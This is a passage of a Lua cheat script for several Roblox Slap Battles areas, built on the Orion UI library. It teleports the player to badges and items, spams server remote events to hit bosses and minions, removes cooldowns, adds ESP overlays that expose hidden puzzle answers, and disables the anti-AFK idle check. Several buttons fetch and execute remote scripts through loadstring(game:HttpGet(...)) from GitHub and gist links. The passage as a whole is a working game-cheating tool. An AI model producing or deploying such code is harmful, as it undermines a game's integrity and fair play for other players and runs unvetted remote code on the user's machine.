                    fireclickdetector(digitDetector)
                    print("Clicked digit:", digit)
                    task.wait(0.25)
                else
                    print("ClickDetector not found for digit:", digit)
                end
            else
                print("Button not found for digit:", digit)
            end
        end

        -- Enter button
        local enterButton = buttons:FindFirstChild("Enter")
        if enterButton then
            local enterDetector = enterButton:FindFirstChildOfClass("ClickDetector")
            if enterDetector then
                fireclickdetector(enterDetector)
                print("Clicked Enter")
                OrionLib:MakeNotification({
                    Name = "Success",
                    Content = "Chain sequence completed!",
                    Image = "rbxassetid://7733919105",
                    Time = 5
                })
            else
                print("Enter ClickDetector not found")
            end
        else
            print("Enter button not found")
        end
    end
})

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 11828384869 then -- Elude
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    local Tab = Window:MakeTab({
        Name = "Main",
        Icon = "rbxassetid://7733673987",
        PremiumOnly = false
    })

Section = Tab:AddSection({
    Name = "Info"
})

TotalArtificatsCollected = Tab:AddLabel("Total Artificats Collected: [ "..game:GetService("Players").LocalPlayer.PlayerGui.MazeUI.TextLabel.Text.." ]")
Timer = Tab:AddLabel("Timer: [ "..game:GetService("Players").LocalPlayer.PlayerGui.MazeUI:GetChildren()[2].Text.." ]")

if not game.Workspace:FindFirstChild("Pim") then
PimSpawn = Tab:AddLabel("Pim Is Spawned? [ No ]")
else
PimSpawn = Tab:AddLabel("Pim Is Spawned? [ Yes ]")
end

local AutoSetInfoServer
AutoSetInfo = Tab:AddToggle({
	Name = "Auto Set Info",
	Default = false,
	Callback = function(Value)
_G.AutoSetInfo = Value
AutoSetInfoServer = game:GetService("RunService").RenderStepped:Connect(function()
if _G.AutoSetInfo == true then

TotalArtificatsCollected:Set("Total Artificats Collected: [ "..game:GetService("Players").LocalPlayer.PlayerGui.MazeUI.TextLabel.Text.." ]")
Timer:Set("Timer: [ "..game:GetService("Players").LocalPlayer.PlayerGui.MazeUI:GetChildren()[2].Text.." ]")

if not game.Workspace:FindFirstChild("Pim") then
PimSpawn:Set("Pim Is Spawned? [ No ]")
else
PimSpawn:Set("Pim Is Spawned? [ Yes ]")
end

    elseif _G.AutoSetInfo == false then
	    if AutoSetInfoServer then
		    AutoSetInfoServer:Disconnect()
		        AutoSetInfoServer = nil
	end
end
end)
	end    
})

Section = Tab:AddSection({
    Name = "Teleport Artificats"
})

    Tab:AddButton({
        Name = "Teleport To 1 Artificat",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-189, 3, -130)
        end
    })

    Tab:AddButton({
        Name = "Teleport To 2 Artificat",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(99, 3, 194)
        end
    })

    Tab:AddButton({
        Name = "Teleport To 3 Artificat",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(78, 3, -202)
        end
    })

    Tab:AddButton({
        Name = "Teleport To 4 Artificat",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(214, 3, 83)
        end
    })

   Tab:AddButton({
        Name = "Touch All Artificats",
        Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-189, 3, -130)
task.wait(0.5)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(99, 3, 194)
task.wait(0.5)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(78, 3, -202)
task.wait(0.5)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(214, 3, 83)
        end
    })

Section = Tab:AddSection({
    Name = "Badges"
})

    -- Elude Badge
    Tab:AddButton({
        Name = "Get Elude",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-503, 19, -179)
        end
    })

    -- Counter Badge (auto-fire ClickDetectors and timer)
    Tab:AddButton({
        Name = "Auto Get Counter",
        Callback = function()
            if not game:IsLoaded() then game.Loaded:Wait() end
            if getgenv().AutoGetCounterExecuted then return end

            getgenv().AutoGetCounterExecuted = true

            if game.PlaceId == 11828384869 then
                for _, v in pairs(workspace:GetDescendants()) do
                    if v:IsA("ClickDetector") then
                        fireclickdetector(v)
                    end
                end

                local hrp = game.Players.LocalPlayer.Character.HumanoidRootPart
                hrp.CFrame = CFrame.new(1000, 1000, 1000)
                task.wait(0.6)
                hrp.Anchored = true

                local Time = 120
                while Time > 0 do
                    local msg = Instance.new("Message", workspace)
                    msg.Text = "Time left to receive: " .. Time
                    task.wait(1)
                    Time -= 1
                    msg:Destroy()
                end

                task.wait(1.5)

                for _, v in pairs(workspace:GetDescendants()) do
                    if v:IsA("ClickDetector") then
                        fireclickdetector(v)
                    end
                end
            else
                local places = {
                    11520107397, 9015014224, 6403373529, 124596094333302
                }

                for _, id in ipairs(places) do
                    if game.PlaceId == id then
                        while task.wait() do
                            game:GetService("TeleportService"):Teleport(11828384869)
                        end
                    end
                end
            end
        end
    })

    -- Alchemist Hood teleport
    Tab:AddButton({
        Name = "Collect Alchemist Hood",
        Callback = function()
            local lp = game.Players.LocalPlayer
            local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
            local target = workspace:FindFirstChild("_ugcQuestObjectEludeHat")
            if target and target:FindFirstChild("Handle") and hrp then
                if hrp.Anchored then hrp.Anchored = false; task.wait(0.5) end
                hrp.CFrame = target.Handle.CFrame
            end
        end
    })

Section = Tab:AddSection({
    Name = "Others"
})

    Tab:AddToggle({
        Name = "Full Bright",
        Default = false,
        Callback = function(Value)
            local Lighting = game:GetService("Lighting")
            if Value then
                Lighting.Brightness = 10
                Lighting.ClockTime = 12
                Lighting.FogEnd = 10000
                Lighting.GlobalShadows = true
                Lighting.OutdoorAmbient = Color3.fromRGB(127, 127, 127)
            else
                Lighting.Brightness = 2
                Lighting.ClockTime = 14
                Lighting.FogEnd = 100000
                Lighting.GlobalShadows = false
                Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
            end
        end
    })

    Tab:AddButton({
        Name = "Infinite Yield",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        end
    })

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 13833961666 then -- The Dark Realm
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    -- VoidPart Setup
    if not workspace:FindFirstChild("VoidPart") then
        local VoidPart = Instance.new("Part", workspace)
        VoidPart.Name = "VoidPart"
        VoidPart.Position = Vector3.new(-36, -3, 16)
        VoidPart.Size = Vector3.new(2000, 1, 2000)
        VoidPart.Anchored = true
        VoidPart.Transparency = 1
        VoidPart.CanCollide = false
    end

    local Tab = Window:MakeTab({
        Name = "Combat",
        Icon = "rbxassetid://7733674079",
        PremiumOnly = false
    })

    -- Info Section
    local InfoServer = Tab:AddSection({Name = "Info"})
    local CanYouFps = Tab:AddLabel("Your Fps [ " .. math.floor(workspace:GetRealPhysicsFPS()) .. " ]")
    local CheckSlap = Tab:AddLabel("Check Slap [ " .. game.Players.LocalPlayer.leaderstats.Slaps.Value .. " ]")
    local CheckHealth = Tab:AddLabel("Check Health [ " .. game.Players.LocalPlayer.Character.Humanoid.Health .. " ]")
    Tab:AddLabel("You're Using Glove [ " .. game.Players.LocalPlayer.leaderstats.Glove.Value .. " ]")
    Tab:AddParagraph("Game's ID [ " .. game.PlaceId .. " ]", "Server ID [ " .. game.JobId .. " ]")

    Tab:AddToggle({
        Name = "Auto Set Info",
        Default = false,
        Callback = function(Value)
            _G.AutoSetInfo = Value
            while _G.AutoSetInfo do
                CanYouFps:Set("Your Fps [ " .. math.floor(workspace:GetRealPhysicsFPS()) .. " ]")
                CheckSlap:Set("Check Slap [ " .. game.Players.LocalPlayer.leaderstats.Slaps.Value .. " ]")
                CheckHealth:Set("Check Health [ " .. game.Players.LocalPlayer.Character.Humanoid.Health .. " ]")
                task.wait()
            end
        end
    })

    -- Combat Section
    Tab:AddSection({Name = "Combat"})

    Tab:AddToggle({
        Name = "Auto Slap Mr. Bob",
        Default = false,
        Callback = function(Value)
            _G.DameBossBob = Value
            while _G.DameBossBob do
                game.Workspace.bobBoss.DamageEvent:FireServer()
                task.wait()
            end
        end
    })

    Tab:AddToggle({
        Name = "Auto Click Tycoon",
        Default = false,
        Callback = function(Value)
            _G.AutoTycoon = Value
            while _G.AutoTycoon do
                for _, v in pairs(workspace:GetChildren()) do
                    if string.find(v.Name, "ÅTycoon") and v:FindFirstChild("Click") then
                        fireclickdetector(v.Click.ClickDetector)
                    end
                end
                task.wait()
            end
        end
    })

    local SpawnRobToggle
    SpawnRobToggle = Tab:AddToggle({
        Name = "Auto Spawn Rob",
        Default = false,
        Callback = function(Value)
            _G.AutoSpawnRob = Value
            if game.Players.LocalPlayer.leaderstats.Glove.Value == "rob" then
                while _G.AutoSpawnRob do
                    game:GetService("ReplicatedStorage").rob:FireServer()
                    wait(15)
                end
            elseif Value == true then
                OrionLib:MakeNotification({
                    Name = "Error",
                    Content = "Get ethernal bob boss fight phase 6.",
                    Image = "rbxassetid://7733658504",
                    Time = 5
                })
                wait(0.05)
                SpawnRobToggle:Set(false)
            end
        end
    })

    local GloveSlap = "Killstreak"

    Tab:AddDropdown({
        Name = "Glove Slap Aura Minions",
        Default = "Killstreak",
        Options = {"Killstreak", "Reaper", "God's Hand", "Tycoon"},
        Callback = function(Value)
            GloveSlap = Value
        end
    })

    Tab:AddToggle({
        Name = "Slap Aura Minions [ Test... ]",
        Default = false,
        Callback = function(Value)
            _G.SlapBobClone = Value
            while _G.SlapBobClone do
                if workspace:FindFirstChild("BobClone") then
                    for _, v in pairs(workspace:GetChildren()) do
                        if v.Name == "BobClone" then
                            local hrp = v:FindFirstChild("HumanoidRootPart")
                            if hrp then
                                local rep = game:GetService("ReplicatedStorage")
                                if GloveSlap == "Killstreak" then
                                    rep.KSHit:FireServer(hrp)
                                elseif GloveSlap == "Reaper" then
                                    rep.ReaperHit:FireServer(hrp)
                                elseif GloveSlap == "God's Hand" then
                                    rep.Godshand:FireServer(hrp)
                                elseif GloveSlap == "Tycoon" then
                                    rep.GeneralHit:FireServer(hrp)
                                end
                            end
                        end
                    end
                end
                task.wait(1.2)
            end
        end
    })

    Tab:AddButton({
        Name = "Slap Aura Bob",
        Callback = function()
            for _, v in ipairs(workspace:GetDescendants()) do
                if v.Name == "BobClone" then
                    local hrp = v:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        local rep = game:GetService("ReplicatedStorage")
                        if GloveSlap == "Killstreak" then
                            rep.KSHit:FireServer(hrp)
                        elseif GloveSlap == "Reaper" then
                            rep.ReaperHit:FireServer(hrp)
                        elseif GloveSlap == "God's Hand" then
                            rep.Godshand:FireServer(hrp)
                        elseif GloveSlap == "Tycoon" then
                            rep.GeneralHit:FireServer(hrp)
                        end
                    end
                end
            end
        end
    })

    -- Utility Scripts
    Tab:AddLabel("Script")
    Tab:AddButton({Name = "Fe fly V3", Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Script/main/Fly_V3.lua"))()
    end})

    Tab:AddButton({Name = "Anti Lag", Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Script/main/Anti-lag.lua"))()
    end})

    Tab:AddButton({Name = "Inf Yield Delta", Callback = function()
        loadstring(game:HttpGet("https://gist.githubusercontent.com/lxnnydev/c533c374ca4c1dcef4e1e10e33fa4a0c/raw/03e74f184f801dad77d3ebe1e2f18c6ac87ca612/delta_IY.gistfile1.txt.lua"))()
    end})

    Tab:AddButton({Name = "Inf Yield", Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
    end})

    Tab:AddButton({Name = "RemoteSpy", Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Script/main/RemoteSpy-V2.lua", true))()
    end})

    Tab:AddButton({Name = "TP back to Slap Battles", Callback = function()
        game:GetService("TeleportService"):Teleport(6403373529)
    end})

    Tab:AddButton({Name = "[ Destroy GUI ] [ Toggle Gui ]", Callback = function()
        OrionLib:Destroy()
        if game.Players.LocalPlayer.PlayerGui:FindFirstChild("ToggleUi") then
            game.Players.LocalPlayer.PlayerGui:FindFirstChild("ToggleUi"):Destroy()
        end
    end})

    -- Anti Tab
    local Tab = Window:MakeTab({
        Name = "Anti",
        Icon = "rbxassetid://4370318685",
        PremiumOnly = false
    })

    Tab:AddButton({
        Name = "Anti VFX",
        Callback = function()
            local vfx = game.Players.LocalPlayer.PlayerScripts:FindFirstChild("VFXListener")
            if vfx then
                vfx.Parent = game.ReplicatedStorage
            else
                game.ReplicatedStorage.VFXListener.Parent = game.Players.LocalPlayer.PlayerScripts
            end
        end
    })

    Tab:AddToggle({
        Name = "Anti Ring",
        Default = false,
        Callback = function(Value)
            _G.AntiRing = Value
            while _G.AntiRing do
                local ring = workspace:FindFirstChild("Ring")
                if ring then ring:Destroy() end
                task.wait()
            end
        end
    })

    Tab:AddToggle({
        Name = "Auto Remove Big Meteors",
        Default = false,
        Callback = function(Value)
            _G.AutoRemoveBigMeteors = Value
            while _G.AutoRemoveBigMeteors do
                local vfx = game.Players.LocalPlayer.PlayerScripts.VFXListener
                if vfx:FindFirstChild("BigExplosion") then
                    vfx.BigExplosion:Destroy()
                end
                task.wait()
            end
        end
    })

    Tab:AddToggle({
        Name = "Auto Remove Small Meteors",
        Default = false,
        Callback = function(Value)
            _G.AutoRemoveSmallMeteors = Value
            while _G.AutoRemoveSmallMeteors do
                local vfx = game.Players.LocalPlayer.PlayerScripts.VFXListener
                if vfx:FindFirstChild("SmallMeteorVFX") then
                    vfx.SmallMeteorVFX:Destroy()
                end
                task.wait()
            end
        end
    })

    Tab:AddToggle({
        Name = "Anti Void Damage",
        Default = false,
        Callback = function(Value)
            local vp = workspace:FindFirstChild("VoidPart")
            if vp then
                vp.CanCollide = Value
                vp.Transparency = Value and 0.5 or 1
            end
        end
    })

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 14422118326 then -- Null Zone
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    local Tab = Window:MakeTab({
        Name = "Misc",
        Icon = "rbxassetid://4370318685",
        PremiumOnly = false
    })

    -- Anti Null Toggle
    Tab:AddToggle({
        Name = "Anti Null",
        Default = false,
        Callback = function(Value)
            AntiNull = Value
            while AntiNull do
                for _, mob in pairs(game.Workspace.Mobs:GetChildren()) do
                    if mob.Name == "Imp" and mob:FindFirstChild("Body") then
                        game:GetService("ReplicatedStorage").b:FireServer(mob.Body)
                    end
                end
                task.wait()
            end
        end
    })

    -- Anti Cooldown Toggle
    Tab:AddToggle({
        Name = "Anti Cooldown",
        Default = false,
        Callback = function(Value)
            AntiCooldown = Value
            while AntiCooldown do
                local player = game.Players.LocalPlayer
                local character = player.Character or player.CharacterAdded:Wait()
                local tool = character:FindFirstChildOfClass("Tool") or player.Backpack:FindFirstChildOfClass("Tool")
                if tool then
                    local localscript = tool:FindFirstChildOfClass("LocalScript")
                    if localscript then
                        local clone = localscript:Clone()
                        localscript:Destroy()
                        clone.Parent = tool
                    end
                end
                task.wait()
            end
        end
    })

    -- Speed Fly
    _G.SetSpeedFly = 100

    Tab:AddTextbox({
        Name = "Speed Fly",
        Default = "Userspeed",
        TextDisappear = false,
        Callback = function(Value)
            _G.SetSpeedFly = tonumber(Value) or 100
        end
    })

    -- Start Fly
    Tab:AddToggle({
        Name = "Start Fly",
        Default = false,
        Callback = function(Value)
            _G.StartFly = Value

            local function removeHandlers()
                local hrp = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    if hrp:FindFirstChild("VelocityHandler") then hrp.VelocityHandler:Destroy() end
                    if hrp:FindFirstChild("GyroHandler") then hrp.GyroHandler:Destroy() end
                end
                local humanoid = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                if humanoid then humanoid.PlatformStand = false end
            end

            if not Value then
                removeHandlers()
                return
            end

            while _G.StartFly do
                local char = game.Players.LocalPlayer.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                if char and hrp then
                    local humanoid = char:FindFirstChildOfClass("Humanoid")
                    local velocity = hrp:FindFirstChild("VelocityHandler")
                    local gyro = hrp:FindFirstChild("GyroHandler")

                    if velocity and gyro then
                        velocity.MaxForce = Vector3.new(9e9, 9e9, 9e9)
                        gyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
                        humanoid.PlatformStand = true
                        gyro.CFrame = workspace.CurrentCamera.CFrame
                        velocity.Velocity = Vector3.new()

                        local moveVec = require(game.Players.LocalPlayer.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("ControlModule")):GetMoveVector()
                        local cam = workspace.CurrentCamera

                        velocity.Velocity += cam.CFrame.RightVector * moveVec.X * _G.SetSpeedFly
                        velocity.Velocity -= cam.CFrame.LookVector * moveVec.Z * _G.SetSpeedFly

                    elseif not velocity and not gyro then
                        local bv = Instance.new("BodyVelocity")
                        bv.Name = "VelocityHandler"
                        bv.Parent = hrp
                        bv.MaxForce = Vector3.new(0, 0, 0)
                        bv.Velocity = Vector3.new(0, 0, 0)

                        local bg = Instance.new("BodyGyro")
                        bg.Name = "GyroHandler"
                        bg.Parent = hrp
                        bg.MaxTorque = Vector3.new(0, 0, 0)
                        bg.P = 1000
                        bg.D = 50
                    end
                end
                task.wait()
            end
        end
    })

    -- Get Null
    Tab:AddButton({
        Name = "Get Null",
        Callback = function()
            local player = game.Players.LocalPlayer
            player.Character.HumanoidRootPart.CFrame = CFrame.new(5458, -189, 1854)
            wait(2)
            fireclickdetector(workspace.Model.Handle.ClickDetector)
        end
    })

    -- Get Tinkerer
    Tab:AddButton({
        Name = "Get Tinkerer",
        Callback = function()
            local player = game.Players.LocalPlayer
            player.Character.HumanoidRootPart.CFrame = CFrame.new(4833.31, -214, 800.529)
            wait(2)
            fireclickdetector(workspace:GetChildren()[13].Handle.ClickDetector)
        end
    })

    -- Get Rob Plushie
    Tab:AddButton({
        Name = "Get Rob Plushie",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(5259, -139, 861)
            wait(2)
            fireclickdetector(workspace._ugcQuestObjectBobPlushie.ClickDetector)
        end
    })

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 16034567693 then -- Staff Application
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    local Tab = Window:MakeTab({
        Name = "Misc",
        Icon = "rbxassetid://4370318685",
        PremiumOnly = false
    })

    Tab:AddLabel("Owner Credits Script By [ Giang ]")
    Tab:AddLabel("DonjoSx Shared Script Me, GoodLuck")

    local InfoServer = Tab:AddSection({ Name = "Info" })

    local CanYouFps = Tab:AddLabel("Your Fps [ " .. math.floor(workspace:GetRealPhysicsFPS()) .. " ]")
    local TimeServer = Tab:AddLabel("Server Time [ " ..
        math.floor(workspace.DistributedGameTime / 3600) .. " Hour | " ..
        math.floor(workspace.DistributedGameTime / 60) % 60 .. " Minute | " ..
        math.floor(workspace.DistributedGameTime) % 60 .. " Second ]"
    )

    Tab:AddParagraph("Game's ID [ " .. game.PlaceId .. " ]", "Server ID [ " .. game.JobId .. " ]")

    -- Auto Info Update
    Tab:AddToggle({
        Name = "Auto Set Info",
        Default = false,
        Callback = function(Value)
            _G.AutoSetInfo = Value

            while _G.AutoSetInfo do
                CanYouFps:Set("Your Fps [ " .. math.floor(workspace:GetRealPhysicsFPS()) .. " ]")

                if not CanYouPing then
                    CanYouPing = Tab:AddLabel("Your Ping [ Loading... ]")
                end

                local pingStat = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]
                if pingStat then
                    CanYouPing:Set("Your Ping [ " .. pingStat:GetValueString() .. " ]")
                end

                TimeServer:Set("Server Time [ " ..
                    math.floor(workspace.DistributedGameTime / 3600) .. " Hour | " ..
                    math.floor(workspace.DistributedGameTime / 60) % 60 .. " Minute | " ..
                    math.floor(workspace.DistributedGameTime) % 60 .. " Second ]"
                )

                task.wait(1)
            end
        end
    })

    -- Misc Section
    Tab:AddSection({ Name = "Misc" })

    Tab:AddButton({
        Name = "Teleport Enter Final Room",
        Callback = function()
            local player = game.Players.LocalPlayer
            player.Character.HumanoidRootPart.CFrame = CFrame.new(502, 76, 59)

            task.wait(4)

            -- Anti-AFK
            if getconnections then
                for _, v in next, getconnections(player.Idled) do
                    v:Disable()
                end
            end

            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Turned on Anti Afk",
                Image = "rbxassetid://7733658504",
                Time = 3
            })

            OrionLib:MakeNotification({
                Name = "Error",
                Content = "You have to wait the 1 hour, or you have view Info.",
                Image = "rbxassetid://7733658504",
                Time = 5
            })
        end
    })

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 17290438723 then -- Ice Trials
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    -- Badge Tab
    local Tab = Window:MakeTab({
        Name = "Badges",
        Icon = "rbxassetid://7733673987",
        PremiumOnly = false
    })

    Tab:AddButton({
        Name = "Frostbite",
        Callback = function()
            if game.PlaceId ~= 17290438723 then
                game:GetService("TeleportService"):Teleport(17290438723)
            else
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-558, 182, 54)
                for _, descendant in ipairs(workspace:GetDescendants()) do
                    if descendant:IsA("ProximityPrompt") then
                        fireproximityprompt(descendant)
                    end
                end
            end
        end
    })

    Tab:AddSection({ Name = "Other" })

    Tab:AddButton({
        Name = "Remove ProximityPrompt Cooldown",
        Callback = function()
            local prompt = game.workspace:FindFirstChild("FinishDoor_Ice") and game.workspace.FinishDoor_Ice.Model.Part:FindFirstChild("ProximityPrompt")
            if prompt then
                prompt.HoldDuration = 0
            end
        end
    })

    -- ESP Tab
    local Tab = Window:MakeTab({
        Name = "Other",
        Icon = "rbxassetid://7733673987",
        PremiumOnly = false
    })

    -- Real Glass ESP
    Tab:AddToggle({
        Name = "Real Glass ESP",
        Default = false,
        Callback = function(Value)
            KeypadESPEnabled = Value

            if not Value then
                for _, v in pairs(workspace:GetDescendants()) do
                    if v:IsA("BillboardGui") and v.Name == "RealESP" then
                        v:Destroy()
                    end
                end
                return
            end

            task.spawn(function()
                while KeypadESPEnabled do
                    local modelRoot = workspace:FindFirstChild("FinishDoor_Ice")
                    if modelRoot then
                        local plates = modelRoot:FindFirstChild("plates")
                        local model = plates and plates:FindFirstChild("Model")
                        if model then
                            local function checkFoldersRecursive(folder)
                                for _, item in ipairs(folder:GetChildren()) do
                                    if item:IsA("Folder") then
                                        checkFoldersRecursive(item)
                                    elseif item:IsA("MeshPart") and not item:FindFirstChild("TouchInterest") then
                                        if not item:FindFirstChild("RealESP") then
                                            local gui = Instance.new("BillboardGui")
                                            gui.Name = "RealESP"
                                            gui.Adornee = item
                                            gui.Size = UDim2.new(0, 150, 0, 40)
                                            gui.StudsOffset = Vector3.new(0, 2, 0)
                                            gui.AlwaysOnTop = true
                                            gui.Parent = item

                                            local label = Instance.new("TextLabel", gui)
                                            label.BackgroundTransparency = 1
                                            label.Size = UDim2.new(1, 0, 1, 0)
                                            label.TextSize = 16
                                            label.Font = Enum.Font.FredokaOne
                                            label.TextColor3 = Color3.fromRGB(0, 255, 0)
                                            label.TextStrokeTransparency = 0.2
                                            label.Text = "Real"
                                        end
                                    end
                                end
                            end
                            checkFoldersRecursive(model)
                        end
                    end
                    task.wait(0.5)
                end
            end)
        end
    })

    -- Fake Glass ESP
    Tab:AddToggle({
        Name = "Fake Glass ESP",
        Default = false,
        Callback = function(Value)
            FakeESPEnabled = Value

            if not Value then
                for _, v in pairs(workspace:GetDescendants()) do
                    if v:IsA("BillboardGui") and v.Name == "FakeESP" then
                        v:Destroy()
                    end
                end
                return
            end

            task.spawn(function()
                while FakeESPEnabled do
                    local modelRoot = workspace:FindFirstChild("FinishDoor_Ice")
                    if modelRoot then
                        local plates = modelRoot:FindFirstChild("plates")
                        local model = plates and plates:FindFirstChild("Model")
                        if model then
                            local function searchFakeParts(folder)
                                for _, item in ipairs(folder:GetChildren()) do
                                    if item:IsA("Folder") then
                                        searchFakeParts(item)
                                    elseif item:IsA("MeshPart") and item:FindFirstChild("TouchInterest") then
                                        if not item:FindFirstChild("FakeESP") then
                                            local gui = Instance.new("BillboardGui")
                                            gui.Name = "FakeESP"
                                            gui.Adornee = item
                                            gui.Size = UDim2.new(0, 150, 0, 40)
                                            gui.StudsOffset = Vector3.new(0, 2, 0)
                                            gui.AlwaysOnTop = true
                                            gui.Parent = item

                                            local label = Instance.new("TextLabel", gui)
                                            label.BackgroundTransparency = 1
                                            label.Size = UDim2.new(1, 0, 1, 0)
                                            label.TextSize = 16
                                            label.Font = Enum.Font.FredokaOne
                                            label.TextColor3 = Color3.fromRGB(255, 0, 0)
                                            label.TextStrokeTransparency = 0.2
                                            label.Text = "Fake"
                                        end
                                    end
                                end
                            end
                            searchFakeParts(model)
                        end
                    end
                    task.wait(0.5)
                end
            end)
        end
    })

    -- Ice Essence ESP
    Tab:AddToggle({
        Name = "Ice Essence ESP",
        Default = false,
        Callback = function(Value)
            IceEssenceESPEnabled = Value

            if not Value then
                for _, v in pairs(workspace:GetDescendants()) do
                    if v:IsA("BillboardGui") and v.Name == "IceEssenceESP" then
                        v:Destroy()
                    end
                end
                return
            end

            task.spawn(function()
                while IceEssenceESPEnabled do
                    local model = workspace:FindFirstChild("FinishDoor_Ice") and workspace.FinishDoor_Ice:FindFirstChild("Model")
                    if model then
                        local iceEssencePart = model:FindFirstChild("Part")
                        if iceEssencePart and iceEssencePart:IsA("BasePart") then
                            local gui = iceEssencePart:FindFirstChild("IceEssenceESP")
                            if not gui then
                                gui = Instance.new("BillboardGui")
                                gui.Name = "IceEssenceESP"
                                gui.Adornee = iceEssencePart
                                gui.Size = UDim2.new(0, 150, 0, 40)
                                gui.StudsOffset = Vector3.new(0, 2, 0)
                                gui.AlwaysOnTop = true
                                gui.Parent = iceEssencePart

                                local label = Instance.new("TextLabel", gui)
                                label.Name = "Label"
                                label.BackgroundTransparency = 1
                                label.Size = UDim2.new(1, 0, 1, 0)
                                label.TextSize = 16
                                label.Font = Enum.Font.FredokaOne
                                label.TextColor3 = Color3.fromRGB(0, 255, 255)
                                label.TextStrokeTransparency = 0.2
                                label.Text = "Ice Essence"
                            end

                            local label = gui:FindFirstChild("Label")
                            local player = game.Players.LocalPlayer
                            local char = player.Character or player.CharacterAdded:Wait()
                            local hrp = char:FindFirstChild("HumanoidRootPart")
                            if label and hrp then
                                local dist = math.floor((iceEssencePart.Position - hrp.Position).Magnitude)
                                label.Text = "Ice Essence | " .. dist .. "m"
                            end
                        end
                    end
                    task.wait(0.5)
                end
            end)
        end
    })

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 18550498098 then -- Where Guide Resides
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    if game.Workspace:FindFirstChild("VoidPart") == nil then
        local VoidPart = Instance.new("Part", workspace)
        VoidPart.Position = Vector3.new(538, 55, -231)
        VoidPart.Name = "VoidPart"
        VoidPart.Size = Vector3.new(2048, 11, 2048)
        VoidPart.Anchored = true
        VoidPart.Transparency = 1
        VoidPart.CanCollide = false

        local Safe = Instance.new("Part", VoidPart)
        Safe.Position = Vector3.new(595, 120, -330)
        Safe.Name = "Safe"
        Safe.Size = Vector3.new(2000, 10, 2000)
        Safe.Anchored = true
        Safe.Transparency = 0.5
        Safe.CanCollide = true
    end

    local Tab = Window:MakeTab({
        Name = "Misc",
        Icon = "rbxassetid://4370318685",
        PremiumOnly = false
    })

    local Tab1 = Window:MakeTab({
        Name = "Anti",
        Icon = "rbxassetid://7734056608",
        PremiumOnly = false
    })

    local Tab2 = Window:MakeTab({
        Name = "Local",
        Icon = "rbxassetid://4335489011",
        PremiumOnly = false
    })

    Tab:AddButton({
        Name = "Start Enter + 1 HP",
        Callback = function()
            local plr = game.Players.LocalPlayer
            local char = plr.Character or plr.CharacterAdded:Wait()

            char.HumanoidRootPart.CFrame = CFrame.new(3258, -68, 823)
            wait(2.8)
            char.HumanoidRootPart.CFrame = game.Workspace["the cube of life"].Part.CFrame
            wait(0.5)
            char.HumanoidRootPart.CFrame = game.Workspace["Big Heart"].CFrame
            wait(1)
            char.HumanoidRootPart.CFrame = game.Workspace.ShackLever.Base.CFrame
            wait(0.5)

            for _, v in pairs(game.Workspace:GetDescendants()) do
                if v.Name == "ShackLever" and v:FindFirstChild("ClickDetector") then
